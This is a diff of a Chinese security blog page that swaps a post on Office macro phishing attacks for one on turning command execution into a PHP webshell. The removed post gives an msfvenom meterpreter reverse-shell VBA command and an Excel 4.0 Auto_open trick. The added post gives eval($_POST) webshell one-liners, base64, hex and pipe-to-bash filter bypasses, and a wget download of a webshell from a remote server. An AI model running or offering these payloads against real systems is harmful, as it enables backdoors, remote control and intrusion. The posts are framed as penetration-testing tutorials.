@@ -18,7 +18,7 @@
   <meta name="author" content="麻薯">
   <meta name="keywords" content="">
   
-  <title>office宏攻击 - Leticia&#39;s Blog</title>
+  <title>命令执行写webshell总结 - Leticia&#39;s Blog</title>
 
   <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/css/bootstrap.min.css" />
 
@@ -163,7 +163,7 @@
       <div class="full-bg-img">
         <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
           <div class="page-header text-center fade-in-up">
-            <span class="h2" id="subtitle" title="office宏攻击">
+            <span class="h2" id="subtitle" title="命令执行写webshell总结">
               
             </span>
 
@@ -173,8 +173,8 @@
   
     <span class="post-meta">
       <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-      <time datetime="2020-08-20 20:50" pubdate>
-        2020年8月20日 晚上
+      <time datetime="2021-05-20 22:00" pubdate>
+        2021年5月20日 晚上
       </time>
     </span>
   
@@ -185,7 +185,7 @@
     
     <span class="post-meta mr-2">
       <i class="iconfont icon-chart"></i>
-      589 字
+      614 字
     </span>
   
 
@@ -195,7 +195,7 @@
       <i class="iconfont icon-clock-fill"></i>
       
       
-      6
+      8
        分钟
     </span>
   
@@ -225,38 +225,39 @@
         <div class="py-5" id="board">
           <article class="post-content mx-auto">
             <!-- SEO header -->
-            <h1 style="display: none">office宏攻击</h1>
+            <h1 style="display: none">命令执行写webshell总结</h1>
             
             <div class="markdown-body">
-              <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>office宏攻击是钓鱼邮件场景中最常见的攻击手段，其制作简单，兼容性强，非常适合批量攻击，但由于其需要用户交互，隐蔽性差，攻击能否成功基本取决于目标的安全意识强弱。</p>
-<h2 id="宏病毒"><a href="#宏病毒" class="headerlink" title="宏病毒"></a>宏病毒</h2><p>office宏病毒一般寄存于office文档中，如word，excel，ppt，以excel最常见，当用户打开这种文档时，内置的宏命令就会执行，在计算机中执行恶意命令。</p>
-<p>一般的恶意命令会自动访问提前部署好的恶意服务器下载木马程序到本地并运行，从而控制计算机。</p>
-<h2 id="攻击示例"><a href="#攻击示例" class="headerlink" title="攻击示例"></a>攻击示例</h2><h3 id="CobaltStrike生成office宏病毒"><a href="#CobaltStrike生成office宏病毒" class="headerlink" title="CobaltStrike生成office宏病毒"></a>CobaltStrike生成office宏病毒</h3><p>使用CobaltStrike的宏病毒生成功能可以轻松生成恶意宏代码，部署CobaltStrike服务器并打开客户端，创建一个监听器</p>
-<p><img src="https://github.com/echohun/blog_image/blob/master/office/office_01.png?raw=true" srcset="/img/loading.gif" lazyload></p>
-<p>然后点击Attacks-Package-MS Office Macro-选定监听器-生成对应的宏病毒-复制到剪贴板</p>
-<p><img src="https://github.com/echohun/blog_image/blob/master/office/office_02.png?raw=true" srcset="/img/loading.gif" lazyload></p>
-<p>然后创建一个新word-视图-查看宏中新建一个宏名</p>
-<p><img src="https://github.com/echohun/blog_image/blob/master/office/office_03.png?raw=true" srcset="/img/loading.gif" lazyload></p>
-<p>在里面粘贴刚才复制的宏，并在保存时点击否另存为.doxm文件</p>
-<p><img src="https://github.com/echohun/blog_image/blob/master/office/office_04.png?raw=true" srcset="/img/loading.gif" lazyload></p>
-<p><img src="https://github.com/echohun/blog_image/blob/master/office/office_05.png?raw=true" srcset="/img/loading.gif" lazyload></p>
-<p>当打开word文档并点击启用宏代码时，就会触发宏，反弹shell到Cobalt Strike中</p>
-<h3 id="msf生成vba文件"><a href="#msf生成vba文件" class="headerlink" title="msf生成vba文件"></a>msf生成vba文件</h3><p>使用msf生成vba文件：</p>
-<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">msfvenom -<span class="hljs-selector-tag">p</span> windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -<span class="hljs-selector-tag">i</span> <span class="hljs-number">5</span> lhost=xx<span class="hljs-selector-class">.xx</span><span class="hljs-selector-class">.xx</span><span class="hljs-selector-class">.xx</span> lport=<span class="hljs-number">4444</span> -f vba -o <span class="hljs-number">123</span>.vba<br></code></pre></td></tr></table></figure>
+              <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>当我们找到一个rce漏洞却无法反弹shell时，在web路径写webshell用连接工具进行管理会方便的多，本文总结从命令执行到webshell的流程化操作。</p>
+<h2 id="寻找web路径"><a href="#寻找web路径" class="headerlink" title="寻找web路径"></a>寻找web路径</h2><p>写webshell当然要写在web路径，第一步要做的就是快速寻找web路径</p>
+<h3 id="1-文件查找法"><a href="#1-文件查找法" class="headerlink" title="1.文件查找法"></a>1.文件查找法</h3><p>一般web路径一定会有index.html\php\jsp\asp，login.xxx文件。可以根据已知页面文件名全局搜索</p>
+<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs vim">linux:<br><span class="hljs-keyword">find</span> / -name <span class="hljs-built_in">index</span>.php<br><span class="hljs-keyword">find</span> / -name <span class="hljs-built_in">index</span>.*<br>window<span class="hljs-variable">s:</span><br><span class="hljs-keyword">for</span> /r d:/ %i in (<span class="hljs-built_in">index</span>.html) <span class="hljs-keyword">do</span> @echo %i<br><span class="hljs-keyword">for</span> /r d:/ %i in (<span class="hljs-built_in">index</span>.*) <span class="hljs-keyword">do</span> @echo %i<br></code></pre></td></tr></table></figure>
 
-<p>后面的步骤与CobaltStrike中相似，创建一个新word-视图-查看宏中新建一个宏名</p>
-<p>在里面粘贴刚才复制的宏，并在保存时点击否另存为.doxm文件</p>
-<p>当打开word文档并点击启用宏代码时，就会触发宏，反弹shell到msf中</p>
-<h3 id="使用excel4-0宏执行命令"><a href="#使用excel4-0宏执行命令" class="headerlink" title="使用excel4.0宏执行命令"></a>使用excel4.0宏执行命令</h3><p>创建一个word或excel文档，如果是word需要插入excel工作表</p>
-<p><img src="https://github.com/echohun/blog_image/blob/master/office/office_06.png?raw=true" srcset="/img/loading.gif" lazyload></p>
-<p>右键点击底部的sheet-插入，选择MS Excel 4.0宏表</p>
-<p><img src="https://github.com/echohun/blog_image/blob/master/office/office_07.png?raw=true" srcset="/img/loading.gif" lazyload></p>
-<p>在表格中写入= EXEC(“calc.exe”)</p>
-<p><img src="https://github.com/echohun/blog_image/blob/master/office/office_08.png?raw=true" srcset="/img/loading.gif" lazyload></p>
-<p>点击此格，将单元格命名为Auto_open，并可以将此sheet右键隐藏，重新打开word文档将会自动执行命令。</p>
-<p><img src="https://github.com/echohun/blog_image/blob/master/office/office_09.png?raw=true" srcset="/img/loading.gif" lazyload></p>
-<h3 id="在excel中嵌入宏代码"><a href="#在excel中嵌入宏代码" class="headerlink" title="在excel中嵌入宏代码"></a>在excel中嵌入宏代码</h3><p>excel中可以直接嵌入dde指令，参考csv注入中的攻击方式即可。</p>
-<p>参考文档：<br><a target="_blank" rel="noopener" href="http://uuzdaisuki.com/2020/07/16/csv%E6%B3%A8%E5%85%A5%E5%88%A9%E7%94%A8%E5%92%8C%E7%BB%95%E8%BF%87%E6%80%BB%E7%BB%93/">http://uuzdaisuki.com/2020/07/16/csv%E6%B3%A8%E5%85%A5%E5%88%A9%E7%94%A8%E5%92%8C%E7%BB%95%E8%BF%87%E6%80%BB%E7%BB%93/</a></p>
+<h3 id="2-源码查找法"><a href="#2-源码查找法" class="headerlink" title="2.源码查找法"></a>2.源码查找法</h3><p>也可以选择打开当前已知web页面的f12查看源码，寻找一段特征足够明显的源码进行查找</p>
+<figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs gradle">linux:<br><span class="hljs-keyword">find</span> / -name <span class="hljs-string">&quot;*.*&quot;</span> | xargs <span class="hljs-keyword">grep</span> <span class="hljs-string">&quot;PHP installed properly&quot;</span><br><span class="hljs-keyword">find</span> <span class="hljs-regexp">/var/</span>www/ -name <span class="hljs-string">&quot;*.php&quot;</span> | xargs <span class="hljs-keyword">grep</span> <span class="hljs-string">&quot;doServerTest()&quot;</span><br><br>windows:<br>findstr <span class="hljs-regexp">/s/i</span><span class="hljs-regexp">/n /</span>d:D:\sec_tools\ /c:<span class="hljs-string">&quot;html&quot;</span> *.html<br>findstr <span class="hljs-regexp">/s/i</span><span class="hljs-regexp">/n /</span>d:C:\windows\ /c:<span class="hljs-string">&quot;success&quot;</span> *.*<br></code></pre></td></tr></table></figure>
+
+<h3 id="3-history等"><a href="#3-history等" class="headerlink" title="3.history等"></a>3.history等</h3><p>通过linux历史命令查找web相关的服务启动命令</p>
+<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">history</span> | <span class="hljs-keyword">grep</span> nginx<br><span class="hljs-keyword">history</span> | <span class="hljs-keyword">grep</span> tomcat<br><span class="hljs-keyword">history</span> | <span class="hljs-keyword">grep</span> http<br></code></pre></td></tr></table></figure>
+
+
+<h2 id="写入webshell"><a href="#写入webshell" class="headerlink" title="写入webshell"></a>写入webshell</h2><p>确认寻找到的路径有写入权限之后，就可以开始写webshell了</p>
+<h3 id="1-echo直接写入"><a href="#1-echo直接写入" class="headerlink" title="1.echo直接写入"></a>1.echo直接写入</h3><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="xml">echo &#x27;</span><span class="php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-number">1</span>]); <span class="hljs-meta">?&gt;</span></span><span class="xml">&#x27; &gt; 1.php</span><br></code></pre></td></tr></table></figure>
+<p>直接写入webshell一般不会成功，因为webshell中使用的某些关键符号可能被转码或屏蔽</p>
+<h3 id="2-base64写入"><a href="#2-base64写入" class="headerlink" title="2.base64写入"></a>2.base64写入</h3><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">echo</span> <span class="hljs-string">&quot;PD9waHAgZXZhbCgkX1BPU1RbMV0pOyA/Pg==&quot;</span> | base<span class="hljs-number">64</span> -d &gt;<span class="hljs-number">2</span>.php<br></code></pre></td></tr></table></figure>
+<p>使用base64是比较通用的方法，完美去除了webshell本身的特殊字符</p>
+<h3 id="3-绕过重定向符"><a href="#3-绕过重定向符" class="headerlink" title="3.绕过重定向符"></a>3.绕过重定向符</h3><figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs coq">echo <span class="hljs-string">&quot;ZWNobyAiUEQ5d2FIQWdaWFpoYkNna1gxQlBVMVJiTVYwcE95QS9QZz09IiB8IGJhc2U2NCAtZCA+My5waHA=&quot;</span> | <span class="hljs-type">base64</span> -d | <span class="hljs-type">bash</span><br></code></pre></td></tr></table></figure>
+<figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs coq">echo <span class="hljs-string">&quot;ZWNobyAiUEQ5d2FIQWdaWFpoYkNna1gxQlBVMVJiTVYwcE95QS9QZz09IiB8IGJhc2U2NCAtZCA+My5waHA=&quot;</span> | <span class="hljs-type">base64</span> -d | <span class="hljs-type">sh</span><br></code></pre></td></tr></table></figure>
+<p>重定向符&gt;不可用时，我们可以将1或2中的整体命令base64编码，然后解码后通过bash或sh执行</p>
+<p>其他字符绕过方式，如空格对应${IFS}等，可参考命令注入的绕过方式 <a target="_blank" rel="noopener" href="http://uuzdaisuki.com/2020/07/15/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/">http://uuzdaisuki.com/2020/07/15/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/</a></p>
+<h3 id="4-远端下载webshell"><a href="#4-远端下载webshell" class="headerlink" title="4.远端下载webshell"></a>4.远端下载webshell</h3><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">远端服务器放置webshell,开启<span class="hljs-keyword">http</span><br>python -m <span class="hljs-keyword">http</span>.server<br><br>目标机器执行<br>wget <span class="hljs-keyword">http</span>://xx.xx.xxx.xx:<span class="hljs-number">8000</span>/xxx.php<br></code></pre></td></tr></table></figure>
+<p>可出网且有wget的情况下可采用此方式</p>
+<h3 id="5-hex写入"><a href="#5-hex写入" class="headerlink" title="5.hex写入"></a>5.hex写入</h3><p>hex写入与base64写入相似，在 <a target="_blank" rel="noopener" href="https://www.107000.com/T-Hex/">https://www.107000.com/T-Hex/</a><br>将webshell编码成hex，使用xxd命令还原</p>
+<p>或在使用前将webshell使用xxd生成hex数据</p>
+<figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="xml">echo &#x27;</span><span class="php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-number">1</span>]); <span class="hljs-meta">?&gt;</span></span><span class="xml">&#x27; |xxd -ps</span><br></code></pre></td></tr></table></figure>
+
+<p>然后命令注入执行</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">echo</span> <span class="hljs-number">3</span>C<span class="hljs-number">3</span>F<span class="hljs-number">706870206576616</span>C<span class="hljs-number">28245</span>F<span class="hljs-number">504</span>F<span class="hljs-number">53545</span>B<span class="hljs-number">315</span>D<span class="hljs-number">293</span>B<span class="hljs-number">203</span>F<span class="hljs-number">3</span>E|xxd -r -ps &gt; <span class="hljs-number">5</span>.php<br></code></pre></td></tr></table></figure>
+
 
             </div>
             <hr>
@@ -266,7 +267,7 @@
                   <div class="post-meta mr-3">
                     <i class="iconfont icon-category"></i>
                     
-                      <a class="hover-with-bg" href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">渗透测试</a>
+                      <a class="hover-with-bg" href="/categories/bypass/">bypass</a>
                     
                   </div>
                 
@@ -274,7 +275,7 @@
                   <div class="post-meta">
                     <i class="iconfont icon-tags"></i>
                     
-                      <a class="hover-with-bg" href="/tags/office/">office</a>
+                      <a class="hover-with-bg" href="/tags/bypass/">bypass</a>
                     
                   </div>
                 
@@ -291,18 +292,12 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2020/09/15/%E6%94%BB%E5%87%BB%E6%BA%AF%E6%BA%90%E7%9A%84%E6%8E%92%E6%9F%A5%E8%8C%83%E5%9B%B4/">
-                        <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">攻击溯源的排查范围</span>
-                        <span class="visible-mobile">上一篇</span>
-                      </a>
-                    
                   </article>
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2020/08/07/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%90%84%E9%98%B6%E6%AE%B5%E5%B7%A5%E5%85%B7%E9%80%9F%E6%9F%A5-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/">
-                        <span class="hidden-mobile">渗透测试各阶段工具速查(持续更新)</span>
+                      <a href="/2021/05/19/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E6%80%BB%E7%BB%93/">
+                        <span class="hidden-mobile">内网信息收集总结</span>
                         <span class="visible-mobile">下一篇</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
